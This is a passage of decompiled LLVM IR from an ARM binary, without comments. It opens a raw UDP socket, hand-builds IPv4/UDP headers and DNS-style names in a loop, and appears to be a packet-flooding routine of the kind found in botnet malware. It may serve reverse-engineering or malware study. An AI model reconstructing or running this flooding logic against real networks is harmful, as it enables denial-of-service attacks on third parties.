  store i32 %v1_a66c, i32* %r1.global-to-local, align 4
  br i1 %v2_a660, label %dec_label_pc_a674, label %dec_label_pc_a684

dec_label_pc_a674:                                ; preds = %dec_label_pc_a65c
  %v7_a674 = icmp eq i8 %v2_a65c, 9
  store i1 %v7_a674, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a674, label %dec_label_pc_a650, label %bb

bb:                                               ; preds = %dec_label_pc_a674
  %v8_a678 = icmp eq i8 %v2_a65c, 32
  store i1 %v8_a678, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_a678, label %dec_label_pc_a650, label %dec_label_pc_a680

dec_label_pc_a680:                                ; preds = %bb
  %v1_a680 = add i32 %v0_a680, 1
  store i32 %v1_a680, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a684

dec_label_pc_a684:                                ; preds = %dec_label_pc_a65c, %dec_label_pc_a680
  %v0_a68030 = phi i32 [ %v0_a680, %dec_label_pc_a65c ], [ %v1_a680, %dec_label_pc_a680 ]
  %v0_a66026 = phi i32 [ %v0_a660, %dec_label_pc_a65c ], [ %v1_a680, %dec_label_pc_a680 ]
  %v7_a684 = icmp eq i8 %v2_a65c, 46
  store i1 %v7_a684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a684, label %dec_label_pc_a648, label %bb103

bb103:                                            ; preds = %dec_label_pc_a684
  %v8_a688 = icmp eq i32 %v1_a66c, 9
  store i1 %v8_a688, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_a66c, 10
  br i1 %tmp, label %dec_label_pc_a648, label %dec_label_pc_a690

dec_label_pc_a690:                                ; preds = %dec_label_pc_a648, %bb103
  %v0_a650.lcssa = phi i32 [ %v1_a664, %dec_label_pc_a648 ], [ %v0_a650, %bb103 ]
  %v2_a694 = sub i32 %v0_a650.lcssa, %v0_a628
  store i32 %v2_a694, i32* @r4, align 4
  %v2_a698 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_a638, i32* %r1.global-to-local, align 4
  store i32 %v2_a698, i32* %r0.global-to-local, align 4
  store i32 %v2_a694, i32* %r2.global-to-local, align 4
  %v3_a6a8 = call i32 @function_10190(i32 %v2_a698, i32 %v2_a638, i32 %v2_a694)
  %v2_a6ac = ptrtoint i32* %stack_var_-40 to i32
  %v1_a6b0 = load i32, i32* @r4, align 4
  %v2_a6b0 = add i32 %v1_a6b0, %v2_a6ac
  store i32 %v2_a6b0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_a698, i32* @r0, align 4
  %v3_a6bc = add i32 %v2_a6b0, -36
  %v4_a6bc = inttoptr i32 %v3_a6bc to i8*
  store i8 0, i8* %v4_a6bc, align 1
  %v1_a6c0 = call i32 @function_11144(i32 %v2_a698)
  store i32 %v1_a6c0, i32* %r0.global-to-local, align 4
  store i32 %v1_a6c0, i32* @fp, align 4
  br label %dec_label_pc_a6c8

dec_label_pc_a6c811:                              ; preds = %dec_label_pc_aac4
  unreachable

dec_label_pc_a6c8:                                ; preds = %dec_label_pc_ab2c, %dec_label_pc_ab20, %dec_label_pc_ab10, %dec_label_pc_ab00, %dec_label_pc_a690
  %v1_aafc49 = phi i32 [ %v1_aac8, %dec_label_pc_ab2c ], [ %v1_aac8, %dec_label_pc_ab20 ], [ %v1_aac8, %dec_label_pc_ab10 ], [ %v1_aac8, %dec_label_pc_ab00 ], [ %v1_a6c0, %dec_label_pc_a690 ]
  %v0_a6c8 = load i32, i32* @r7, align 4
  %v2_a6c8 = icmp eq i32 %v0_a6c8, 0
  store i1 %v2_a6c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a6c8, label %dec_label_pc_aaf0, label %dec_label_pc_a6d0

dec_label_pc_a6d0:                                ; preds = %dec_label_pc_a6c8
  store i32 %v0_a6c8, i32* %r0.global-to-local, align 4
  %v1_a6d4 = inttoptr i32 %v0_a6c8 to i8*
  %v2_a6d4 = call i32 @function_10120(i8* %v1_a6d4)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v2_a6d4, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_a6e8 = call i32 @function_113bc(i32 2, i32 3, i32 17)
  store i32 %v3_a6e8, i32* %r0.global-to-local, align 4
  %v7_a6ec = icmp eq i32 %v3_a6e8, -1
  store i1 %v7_a6ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a6ec, label %dec_label_pc_aaf0, label %dec_label_pc_a6f8

dec_label_pc_a6f8:                                ; preds = %dec_label_pc_a6d0
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a700 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a700, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a714 = call i32 @function_11378(i32 %v3_a6e8, i32 0, i32 3, i32 %v6_a700, i32 4)
  store i32 %v5_a714, i32* %r0.global-to-local, align 4
  %v7_a718 = icmp eq i32 %v5_a714, -1
  store i1 %v7_a718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a718, label %dec_label_pc_aae8, label %dec_label_pc_a720

dec_label_pc_a720:                                ; preds = %dec_label_pc_a6f8
  %v0_a728 = load i32, i32* %sb.global-to-local, align 4
  %v1_a728 = urem i32 %v0_a728, 256
  store i32 %v1_a728, i32* %sb.global-to-local, align 4
  %v3_a730 = mul i32 %v6_a538, 65536
  store i32 %v3_a730, i32* %r3.global-to-local, align 4
  %v5_a73c = trunc i32 %v0_a728 to i8
  %v0_a740 = load i32, i32* @r8, align 4
  %v2_a740 = icmp eq i32 %v0_a740, 0
  store i1 %v2_a740, i1* %cpsr_z.global-to-local, align 1
  %v3_a744 = urem i32 %v7_a4dc, 65536
  store i32 %v3_a744, i32* %r0.global-to-local, align 4
  %v3_a74c = urem i32 %v6_a538, 65536
  store i32 %v3_a74c, i32* %r2.global-to-local, align 4
  %v3_a750 = mul i32 %v6_a550, 65536
  %v3_a754 = mul i32 %v6_a56c, 65536
  store i32 %v3_a754, i32* %ip.global-to-local, align 4
  br i1 %v2_a740, label %bb104, label %bb105

bb104:                                            ; preds = %dec_label_pc_a720
  %v5_a75c = sext i8 %v5_a73c to i32
  store i32 %v5_a75c, i32* %r2.global-to-local, align 4
  br label %bb105

bb105:                                            ; preds = %dec_label_pc_a720, %bb104
  %v2_a788 = phi i32 [ %v3_a74c, %dec_label_pc_a720 ], [ %v5_a75c, %bb104 ]
  %v3_a768 = urem i32 %v6_a550, 65536
  store i32 %v3_a768, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v3_a770 = urem i32 %v6_a56c, 65536
  store i32 0, i32* %stack_var_-44, align 4
  %v1_a788 = load i32, i32* @r6, align 4
  br i1 %v2_a740, label %.dec_label_pc_a970.preheader_crit_edge, label %dec_label_pc_a790

.dec_label_pc_a970.preheader_crit_edge:           ; preds = %bb105
  %v3_a788 = add i32 %v1_a788, %v2_a788
  store i32 %v3_a788, i32* @r7, align 4
  %.pre = sext i8 %v5_a73c to i32
  br label %dec_label_pc_a970.preheader

dec_label_pc_a790:                                ; preds = %bb105
  %v2_a790 = add i32 %v1_a788, %v1_a728
  %v3_a794 = mul i32 %v2_a790, 65536
  %v1_a79c = add i32 %v3_a794, 1769472
  %v1_a7a0 = add i32 %v3_a794, 3080192
  %tmp106 = udiv i32 %v1_a7a0, 256
  %v3_a7b4 = and i32 %tmp106, 65280
  %v4_a7c4 = udiv i32 %v1_a7a0, 16777216
  %v5_a7c4 = or i32 %v3_a7b4, %v4_a7c4
  store i32 %v5_a7c4, i32* @sl, align 4
  %trunc60 = trunc i32 %v6_a538 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc60)
  %tmp107 = mul i32 %v7_a4dc, 256
  %v3_a7d8 = and i32 %tmp107, 65280
  store i32 %v3_a7d8, i32* %r1.global-to-local, align 4
  %tmp108 = udiv i32 %v7_a4dc, 256
  %v4_a7dc = urem i32 %tmp108, 256
  %v5_a7dc = or i32 %v4_a7dc, %v3_a7d8
  store i32 %v5_a7dc, i32* @sb, align 4
  store i32 %v3_a754, i32* %r2.global-to-local, align 4
  store i32 %v3_a750, i32* %r0.global-to-local, align 4
  %tmp109 = mul i32 %v6_a550, 256
  %v3_a7f0 = and i32 %tmp109, 65280
  %tmp110 = mul i32 %v6_a56c, 256
  %v3_a7f4 = and i32 %tmp110, 65280
  %tmp111 = udiv i32 %v1_a79c, 256
  %v3_a7f8 = and i32 %tmp111, 65280
  store i32 %v3_a7f8, i32* @lr, align 4
  %tmp112 = udiv i32 %v6_a550, 256
  %v4_a7fc = urem i32 %tmp112, 256
  %v5_a7fc = or i32 %v4_a7fc, %v3_a7f0
  store i32 %v5_a7fc, i32* %ip.global-to-local, align 4
  %tmp113 = udiv i32 %v6_a56c, 256
  %v4_a800 = urem i32 %tmp113, 256
  %v5_a800 = or i32 %v4_a800, %v3_a7f4
  store i32 %v5_a800, i32* @r4, align 4
  %v1_a804 = add i32 %v1_a788, 1
  store i32 %v1_a804, i32* %r3.global-to-local, align 4
  %v4_a808 = udiv i32 %v1_a79c, 16777216
  %v5_a808 = or i32 %v4_a808, %tmp111
  store i32 0, i32* @r5, align 4
  %sext = mul i32 %v6_a4b8, 16777216
  %v4_a860 = sdiv i32 %sext, 16777216
  %sext8 = mul i32 %v6_a4f4, 16777216
  %v4_a86c = sdiv i32 %sext8, 16777216
  %v4_a88c = sext i8 %v5_a73c to i32
  %sext9 = mul nuw i32 %v5_a7fc, 65536
  %v7_a8a0 = sdiv i32 %sext9, 65536
  %sext10 = mul nuw i32 %v5_a800, 65536
  %v4_a8c8 = sdiv i32 %sext10, 65536
  %v1_a868 = trunc i32 %v4_a860 to i8
  %extract.t = trunc i32 %v4_a86c to i8
  %v1_a890 = add nsw i32 %v4_a88c, 41
  %sext120 = mul i32 %v5_a808, 65536
  %v3_a8a0 = sdiv i32 %sext120, 65536
  br label %dec_label_pc_a820

dec_label_pc_a820:                                ; preds = %dec_label_pc_a940, %dec_label_pc_a790
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_a828 = call i32 @function_11f24(i32 600, i32 1)
  store i32 %v2_a828, i32* %r0.global-to-local, align 4
  store i32 %v2_a4a0, i32* %ip.global-to-local, align 4
  %v3_a830 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a830, i32* %r3.global-to-local, align 4
  %v2_a834 = load i32, i32* @r5, align 4
  %v5_a834 = mul i32 %v2_a834, 4
  %v6_a834 = add i32 %v5_a834, %v2_a4a0
  %v7_a834 = inttoptr i32 %v6_a834 to i32*
  store i32 %v2_a828, i32* %v7_a834, align 4
  %v0_a838 = load i32, i32* %ip.global-to-local, align 4
  %v1_a838 = load i32, i32* %r3.global-to-local, align 4
  %v4_a838 = mul i32 %v1_a838, 4
  %v5_a838 = add i32 %v4_a838, %v0_a838
  %v6_a838 = inttoptr i32 %v5_a838 to i32*
  %v7_a838 = load i32, i32* %v6_a838, align 4
  store i32 %v7_a838, i32* %r1.global-to-local, align 4
  %v1_a83c = inttoptr i32 %v7_a838 to i8*
  %v2_a83c = load i8, i8* %v1_a83c, align 1
  %tmp127 = urem i8 %v2_a83c, 16
  %v1_a840 = zext i8 %tmp127 to i32
  %v1_a844 = or i32 %v1_a840, 64
  store i32 %v1_a844, i32* %r2.global-to-local, align 4
  %v1_a848 = trunc i32 %v1_a844 to i8
  store i8 %v1_a848, i8* %v1_a83c, align 1
  %v0_a84c = load i32, i32* %r1.global-to-local, align 4
  %v1_a84c = inttoptr i32 %v0_a84c to i8*
  %v2_a84c = load i8, i8* %v1_a84c, align 1
  %v3_a84c = zext i8 %v2_a84c to i32
  %v1_a850 = and i32 %v3_a84c, 240
  %v1_a854 = or i32 %v1_a850, 5
  store i32 %v1_a854, i32* %r3.global-to-local, align 4
  store i32 %v1_a520, i32* %lr.global-to-local, align 4
  %v1_a85c = trunc i32 %v1_a854 to i8
  store i8 %v1_a85c, i8* %v1_a84c, align 1
  store i32 %v4_a860, i32* %r0.global-to-local, align 4
  %v0_a864 = load i32, i32* %lr.global-to-local, align 4
  %v2_a864 = icmp eq i32 %v0_a864, 0
  store i1 %v2_a864, i1* %cpsr_z.global-to-local, align 1
  %v2_a868 = load i32, i32* %r1.global-to-local, align 4
  %v3_a868 = add i32 %v2_a868, 1
  %v4_a868 = inttoptr i32 %v3_a868 to i8*
  store i8 %v1_a868, i8* %v4_a868, align 1
  store i32 %v4_a86c, i32* %r2.global-to-local, align 4
  %v0_a870 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a870, label %.thread13, label %bb114

bb114:                                            ; preds = %dec_label_pc_a820
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_a874 = load i32, i32* %r1.global-to-local, align 4
  %v4_a874 = add i32 %v3_a874, 6
  %v5_a874 = inttoptr i32 %v4_a874 to i16*
  store i16 64, i16* %v5_a874, align 2
  %v0_a87c.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t52 = trunc i32 %v0_a87c.pre to i8
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_a820, %bb114
  %v0_a87c.off0 = phi i8 [ %extract.t, %dec_label_pc_a820 ], [ %extract.t52, %bb114 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_a87c = load i32, i32* %r1.global-to-local, align 4
  %v3_a87c = add i32 %v2_a87c, 8
  %v4_a87c = inttoptr i32 %v3_a87c to i8*
  store i8 %v0_a87c.off0, i8* %v4_a87c, align 1
  %v0_a880 = load i32, i32* %r3.global-to-local, align 4
  %v1_a880 = trunc i32 %v0_a880 to i8
  %v2_a880 = load i32, i32* %r1.global-to-local, align 4
  %v3_a880 = add i32 %v2_a880, 9
  %v4_a880 = inttoptr i32 %v3_a880 to i8*
  store i8 %v1_a880, i8* %v4_a880, align 1
  %v2_a888 = load i32, i32* @global_var_20780.45, align 4
  %v0_a890 = load i32, i32* %r1.global-to-local, align 4
  %v2_a894 = add i32 %v1_a890, %v0_a890
  store i32 %v2_a894, i32* @r4, align 4
  %v2_a898 = add i32 %v0_a890, 12
  %v3_a898 = inttoptr i32 %v2_a898 to i32*
  store i32 %v2_a888, i32* %v3_a898, align 4
  store i32 %v3_a8a0, i32* %r2.global-to-local, align 4
  store i32 %v7_a8a0, i32* %r3.global-to-local, align 4
  %v0_a8a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a8a4 = add i32 %v0_a8a4, 20
  store i32 %v1_a8a4, i32* %ip.global-to-local, align 4
  %v0_a8a8 = load i32, i32* @sl, align 4
  %v1_a8a8 = trunc i32 %v0_a8a8 to i16
  %v3_a8a8 = add i32 %v0_a8a4, 2
  %v4_a8a8 = inttoptr i32 %v3_a8a8 to i16*
  store i16 %v1_a8a8, i16* %v4_a8a8, align 2
  %v0_a8ac = load i32, i32* @sb, align 4
  %v1_a8ac = trunc i32 %v0_a8ac to i16
  %v2_a8ac = load i32, i32* %r1.global-to-local, align 4
  %v3_a8ac = add i32 %v2_a8ac, 4
  %v4_a8ac = inttoptr i32 %v3_a8ac to i16*
  store i16 %v1_a8ac, i16* %v4_a8ac, align 2
  %v0_a8b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_a8b0 = trunc i32 %v0_a8b0 to i16
  %v2_a8b0 = load i32, i32* %ip.global-to-local, align 4
  %v3_a8b0 = add i32 %v2_a8b0, 4
  %v4_a8b0 = inttoptr i32 %v3_a8b0 to i16*
  store i16 %v1_a8b0, i16* %v4_a8b0, align 2
  %v0_a8b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a8b4 = trunc i32 %v0_a8b4 to i16
  %v2_a8b4 = load i32, i32* %ip.global-to-local, align 4
  %v3_a8b4 = add i32 %v2_a8b4, 2
  %v4_a8b4 = inttoptr i32 %v3_a8b4 to i16*
  store i16 %v1_a8b4, i16* %v4_a8b4, align 2
  %v2_a8bc = load i32, i32* %r1.global-to-local, align 4
  %v3_a8bc = add i32 %v2_a8bc, 20
  %v4_a8bc = inttoptr i32 %v3_a8bc to i16*
  store i16 %rev, i16* %v4_a8bc, align 2
  store i32 %v4_a88c, i32* %ip.global-to-local, align 4
  %v0_a8c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a8c4 = add i32 %v0_a8c4, 28
  store i32 %v1_a8c4, i32* %r0.global-to-local, align 4
  store i32 %v4_a8c8, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v3_a8d4 = add i32 %v0_a8c4, 30
  %v4_a8d4 = inttoptr i32 %v3_a8d4 to i16*
  store i16 1, i16* %v4_a8d4, align 2
  %v0_a8d8 = load i32, i32* @lr, align 4
  %v1_a8d8 = trunc i32 %v0_a8d8 to i16
  %v2_a8d8 = load i32, i32* %r0.global-to-local, align 4
  %v3_a8d8 = add i32 %v2_a8d8, 4
  %v4_a8d8 = inttoptr i32 %v3_a8d8 to i16*
  store i16 %v1_a8d8, i16* %v4_a8d8, align 2
  %v0_a8dc = load i32, i32* %ip.global-to-local, align 4
  %v1_a8dc = trunc i32 %v0_a8dc to i8
  %v2_a8dc = load i32, i32* %r1.global-to-local, align 4
  %v3_a8dc = add i32 %v2_a8dc, 40
  %v4_a8dc = inttoptr i32 %v3_a8dc to i8*
  store i8 %v1_a8dc, i8* %v4_a8dc, align 1
  %v0_a8e0 = load i32, i32* @fp, align 4
  %v1_a8e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_a8e0 = add i32 %v1_a8e0, 16
  %v3_a8e0 = inttoptr i32 %v2_a8e0 to i32*
  store i32 %v0_a8e0, i32* %v3_a8e0, align 4
  %v0_a8e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a8e4 = trunc i32 %v0_a8e4 to i16
  %v2_a8e4 = load i32, i32* %r1.global-to-local, align 4
  %v3_a8e4 = add i32 %v2_a8e4, 28
  %v4_a8e4 = inttoptr i32 %v3_a8e4 to i16*
  store i16 %v1_a8e4, i16* %v4_a8e4, align 2
  %v0_a8e8 = load i32, i32* @r4, align 4
  %v1_a8e8 = add i32 %v0_a8e8, 1
  store i32 %v1_a8e8, i32* %r0.global-to-local, align 4
  %v0_a8ec = load i32, i32* @r7, align 4
  store i32 %v0_a8ec, i32* %r1.global-to-local, align 4
  store i32 %v1_a804, i32* %r2.global-to-local, align 4
  %v3_a8f4 = call i32 @function_10190(i32 %v1_a8e8, i32 %v0_a8ec, i32 %v1_a804)
  store i32 %v3_a8f4, i32* %r0.global-to-local, align 4
  %v0_a8f8 = load i32, i32* @r6, align 4
  %v2_a8f8 = icmp eq i32 %v0_a8f8, 0
  store i1 %v2_a8f8, i1* %cpsr_z.global-to-local, align 1
  %tmp115 = icmp slt i32 %v0_a8f8, 1
  br i1 %tmp115, label %bb116, label %dec_label_pc_a908

bb116:                                            ; preds = %.thread13
  %v5_a8fc = load i32, i32* @r4, align 4
  store i32 %v5_a8fc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a940

dec_label_pc_a908:                                ; preds = %.thread13
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_a90c = load i32, i32* @r4, align 4
  store i32 %v0_a90c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a914

dec_label_pc_a914:                                ; preds = %.thread20, %dec_label_pc_a908
  %v0_a920 = phi i32 [ %storemerge, %.thread20 ], [ 0, %dec_label_pc_a908 ]
  %v0_a924 = phi i32 [ %v0_a938, %.thread20 ], [ 0, %dec_label_pc_a908 ]
  %v1_a914 = load i32, i32* @r7, align 4
  %v2_a914 = add i32 %v1_a914, %v0_a924
  %v3_a914 = inttoptr i32 %v2_a914 to i8*
  %v4_a914 = load i8, i8* %v3_a914, align 1
  %v6_a914 = zext i8 %v4_a914 to i32
  store i32 %v6_a914, i32* %r3.global-to-local, align 4
  %v7_a918 = icmp eq i8 %v4_a914, 46
  store i1 %v7_a918, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a918, label %bb117, label %.thread59

.thread59:                                        ; preds = %dec_label_pc_a914
  %v1_a92016 = add nsw i32 %v0_a920, 1
  store i32 %v1_a92016, i32* %r2.global-to-local, align 4
  %v1_a92418 = add i32 %v0_a924, 1
  store i32 %v1_a92418, i32* %r1.global-to-local, align 4
  br label %bb118

bb117:                                            ; preds = %dec_label_pc_a914
  %v2_a91c = load i32, i32* @r4, align 4
  %v3_a91c = add i32 %v2_a91c, %v0_a924
  store i32 %v3_a91c, i32* %r3.global-to-local, align 4
  %v1_a920 = add nsw i32 %v0_a920, 1
  store i32 %v1_a920, i32* %r2.global-to-local, align 4
  %v1_a924 = add i32 %v0_a924, 1
  store i32 %v1_a924, i32* %r1.global-to-local, align 4
  %v2_a928 = trunc i32 %v0_a920 to i8
  %v3_a928 = load i32, i32* %r0.global-to-local, align 4
  %v4_a928 = inttoptr i32 %v3_a928 to i8*
  store i8 %v2_a928, i8* %v4_a928, align 1
  %v0_a92c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a92c.pre, label %bb119, label %bb117.bb118_crit_edge

bb117.bb118_crit_edge:                            ; preds = %bb117
  %v1_a92c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb118

bb118:                                            ; preds = %bb117.bb118_crit_edge, %.thread59
  %v1_a92c = phi i32 [ %v1_a92c.pre, %bb117.bb118_crit_edge ], [ %v1_a92016, %.thread59 ]
  %v2_a92c = urem i32 %v1_a92c, 256
  br label %.thread20

bb119:                                            ; preds = %bb117
  %v1_a930 = load i32, i32* %r3.global-to-local, align 4
  %v2_a930 = add i32 %v1_a930, 1
  store i32 %v2_a930, i32* %r0.global-to-local, align 4
  br label %.thread20

.thread20:                                        ; preds = %bb118, %bb119
  %storemerge = phi i32 [ %v2_a92c, %bb118 ], [ 0, %bb119 ]
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  %v0_a938 = load i32, i32* %r1.global-to-local, align 4
  %v1_a938 = load i32, i32* @r6, align 4
  %v9_a938 = icmp eq i32 %v0_a938, %v1_a938
  store i1 %v9_a938, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a938, label %dec_label_pc_a940.loopexit, label %dec_label_pc_a914

dec_label_pc_a940.loopexit:                       ; preds = %.thread20
  %v2_a940.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t126 = trunc i32 %storemerge to i8
  br label %dec_label_pc_a940

dec_label_pc_a940:                                ; preds = %bb116, %dec_label_pc_a940.loopexit
  %v0_a940.off0 = phi i8 [ %extract.t126, %dec_label_pc_a940.loopexit ], [ 0, %bb116 ]
  %v2_a940 = phi i32 [ %v2_a940.pre, %dec_label_pc_a940.loopexit ], [ %v5_a8fc, %bb116 ]
  %v3_a940 = inttoptr i32 %v2_a940 to i8*
  store i8 %v0_a940.off0, i8* %v3_a940, align 1
  %v3_a944 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a944, i32* %r3.global-to-local, align 4
  %v1_a948 = add i32 %v3_a944, 1
  store i32 %v1_a948, i32* @r5, align 4
  %v0_a94c = load i32, i32* @r4, align 4
  %v1_a94c = load i32, i32* @r6, align 4
  %v2_a94c = add i32 %v1_a94c, %v0_a94c
  store i32 %v2_a94c, i32* %r2.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_a954 = load i32, i32* @r8, align 4
  %v9_a954 = icmp eq i32 %v0_a954, %v1_a948
  store i1 %v9_a954, i1* %cpsr_z.global-to-local, align 1
  %v3_a958 = add i32 %v2_a94c, 4
  %v4_a958 = inttoptr i32 %v3_a958 to i16*
  store i16 256, i16* %v4_a958, align 2
  %v0_a95c = load i32, i32* @lr, align 4
  %v1_a95c = trunc i32 %v0_a95c to i16
  %v2_a95c = load i32, i32* %r2.global-to-local, align 4
  %v3_a95c = add i32 %v2_a95c, 2
  %v4_a95c = inttoptr i32 %v3_a95c to i16*
  store i16 %v1_a95c, i16* %v4_a95c, align 2
  %v0_a960 = load i32, i32* @r5, align 4
  store i32 %v0_a960, i32* %stack_var_-44, align 4
  %v8_a964 = icmp sgt i32 %v0_a954, %v1_a948
  br i1 %v8_a964, label %dec_label_pc_a820, label %dec_label_pc_a968

dec_label_pc_a968:                                ; preds = %dec_label_pc_a940
  store i32 %v4_a88c, i32* %r0.global-to-local, align 4
  %v0_a96c = load i32, i32* @r6, align 4
  %v2_a96c = add i32 %v0_a96c, %v4_a88c
  store i32 %v2_a96c, i32* @r7, align 4
  %v0_a974.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_a970.preheader

dec_label_pc_a970.preheader:                      ; preds = %.dec_label_pc_a970.preheader_crit_edge, %dec_label_pc_a968
  %v4_a9d4.pre-phi = phi i32 [ %.pre, %.dec_label_pc_a970.preheader_crit_edge ], [ %v4_a88c, %dec_label_pc_a968 ]
  %v0_a974.pre = phi i32 [ 0, %.dec_label_pc_a970.preheader_crit_edge ], [ %v0_a974.pre.pre, %dec_label_pc_a968 ]
  %v3_a9a0 = icmp eq i32 %v3_a744, 65535
  %v3_a9b0 = icmp eq i32 %v3_a74c, 65535
  br label %dec_label_pc_a970

dec_label_pc_a970:                                ; preds = %dec_label_pc_a970, %dec_label_pc_aa68, %dec_label_pc_a970.preheader
  %v0_a974 = phi i32 [ %v0_a974.pre, %dec_label_pc_a970.preheader ], [ 0, %dec_label_pc_aa68 ], [ 0, %dec_label_pc_a970 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a974 = icmp eq i32 %v0_a974, 0
  store i1 %v2_a974, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a974, label %dec_label_pc_a970, label %dec_label_pc_a980

dec_label_pc_a980:                                ; preds = %dec_label_pc_a970, %dec_label_pc_aa68
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_a984 = load i32, i32* @r7, align 4
  %v1_a984 = add i32 %v0_a984, 27
  store i32 %v1_a984, i32* @sb, align 4
  %v1_a988 = add i32 %v0_a984, 47
  store i32 %v1_a988, i32* @sl, align 4
  br label %dec_label_pc_a98c

dec_label_pc_a98c:                                ; preds = %dec_label_pc_a9d0, %dec_label_pc_a980
  %v1_a998 = phi i32 [ %v1_aa58, %dec_label_pc_a9d0 ], [ 0, %dec_label_pc_a980 ]
  store i32 %v2_a4a0, i32* %r3.global-to-local, align 4
  store i32 %v3_a744, i32* %ip.global-to-local, align 4
  %v4_a998 = mul i32 %v1_a998, 4
  %v5_a998 = add i32 %v4_a998, %v2_a4a0
  %v6_a998 = inttoptr i32 %v5_a998 to i32*
  %v7_a998 = load i32, i32* %v6_a998, align 4
  store i32 %v7_a998, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_a9a0, i1* %cpsr_z.global-to-local, align 1
  %v1_a9a4 = add i32 %v7_a998, 20
  store i32 %v1_a9a4, i32* @r6, align 4
  br i1 %v3_a9a0, label %dec_label_pc_aa7c, label %dec_label_pc_a9ac

dec_label_pc_a9ac:                                ; preds = %dec_label_pc_a98c
  store i32 %v3_a74c, i32* @lr, align 4
  store i1 %v3_a9b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a9b0, label %dec_label_pc_aa90, label %dec_label_pc_a9b8

dec_label_pc_a9b8:                                ; preds = %dec_label_pc_aa7c.dec_label_pc_a9b8_crit_edge, %dec_label_pc_a9ac
  %v1_a9bc = phi i32 [ %v1_a9bc.pre, %dec_label_pc_aa7c.dec_label_pc_a9b8_crit_edge ], [ 65535, %dec_label_pc_a9ac ]
  store i32 %v3_a768, i32* %r0.global-to-local, align 4
  %v9_a9bc = icmp eq i32 %v3_a768, %v1_a9bc
  store i1 %v9_a9bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a9bc, label %dec_label_pc_aaa4, label %dec_label_pc_a9c4

dec_label_pc_a9c4:                                ; preds = %dec_label_pc_aa90, %dec_label_pc_a9b8
  %v1_a9c8 = phi i32 [ %v1_aa9c, %dec_label_pc_aa90 ], [ %v1_a9bc, %dec_label_pc_a9b8 ]
  store i32 %v3_a770, i32* %r2.global-to-local, align 4
  %v9_a9c8 = icmp eq i32 %v3_a770, %v1_a9c8
  store i1 %v9_a9c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a9c8, label %dec_label_pc_aab8, label %dec_label_pc_a9d0

dec_label_pc_a9d0:                                ; preds = %dec_label_pc_aaa4, %dec_label_pc_a9c4, %dec_label_pc_aab8
  %v0_a9d0 = load i32, i32* @r4, align 4
  %v1_a9d0 = add i32 %v0_a9d0, 41
  store i32 %v1_a9d0, i32* %r0.global-to-local, align 4
  store i32 %v4_a9d4.pre-phi, i32* %r1.global-to-local, align 4
  %v2_a9d8 = call i32 @function_e158(i32 %v1_a9d0, i32 %v4_a9d4.pre-phi)
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a9e0 = load i32, i32* @r4, align 4
  %v3_a9e0 = add i32 %v2_a9e0, 10
  %v4_a9e0 = inttoptr i32 %v3_a9e0 to i16*
  store i16 0, i16* %v4_a9e0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_a9e8 = load i32, i32* @r4, align 4
  store i32 %v0_a9e8, i32* @r0, align 4
  %v2_a9ec = call i32 @function_c848(i32 %v0_a9e8, i32 20)
  %v3_a9ec = trunc i32 %v2_a9ec to i16
  store i32 %v2_a9ec, i32* %r0.global-to-local, align 4
  %v3_a9f0 = load i32, i32* @r4, align 4
  %v4_a9f0 = add i32 %v3_a9f0, 10
